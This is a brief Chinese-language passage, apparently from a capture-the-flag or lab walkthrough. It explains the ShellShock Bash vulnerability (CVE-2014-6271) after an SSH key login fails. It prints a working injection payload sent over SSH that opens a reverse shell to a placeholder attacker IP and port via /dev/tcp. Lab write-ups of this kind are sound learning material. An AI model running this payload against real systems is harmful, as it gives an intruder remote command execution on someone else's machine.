CVE-2014-6271 ShellShock漏洞

使用命令ssh -i noob noob192.168.111.20-0 PubkeyAcceptedKeyTypes=+ssh-rsa尝试强制客户端使用旧版签名算法依旧不行

查阅资料发现可以使用ShellShock漏洞

ShellShock：CVE-2014-6271，又称”破壳漏洞“，它影响了Unix/Linux系统中的Bash解释器。它允许攻击者通过环境变量注入恶意代码，从而实现远程命令执行

基本用法：ssh -i id_rsa user@target '() { :;}; /bin/bash -i >& /dev/tcp/攻击者IP/端口 0>&1'
